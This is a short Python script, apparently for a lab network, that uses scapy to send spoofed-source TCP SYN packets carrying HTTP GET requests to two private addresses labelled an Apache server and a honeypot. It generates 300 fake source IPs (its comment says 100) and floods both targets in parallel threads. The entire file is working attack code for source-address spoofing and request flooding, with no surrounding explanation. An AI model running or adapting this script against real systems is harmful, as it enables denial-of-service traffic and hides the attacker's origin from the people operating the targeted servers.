from scapy.all import IP, TCP, Raw, send, RandShort
import random
import threading

# Target machines
target_apache = "192.168.102.18"
target_honeypot = "192.168.102.17"

# Generate 100 random spoofed IPs
spoofed_ips = ["192.168.102." + str(random.randint(2, 254)) for _ in range(300)]

def spoof_http_request(target_ip, spoofed_ip):
    """Send a spoofed HTTP GET request"""
    ip_layer = IP(src=spoofed_ip, dst=target_ip)
    tcp_layer = TCP(sport=RandShort(), dport=80, flags="S")
    
    http_payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
    
    send(ip_layer / tcp_layer / Raw(load=http_payload), verbose=False)

def attack_target(target):
    """Launch attack on a specific target using multiple spoofed IPs"""
    for ip in spoofed_ips:
        print(f"Sending spoofed request from {ip} to {target}")
        spoof_http_request(target, ip)

# Run attacks in parallel using threads
thread_apache = threading.Thread(target=attack_target, args=(target_apache,))
thread_honeypot = threading.Thread(target=attack_target, args=(target_honeypot,))

thread_apache.start()
thread_honeypot.start()

thread_apache.join()
thread_honeypot.join()
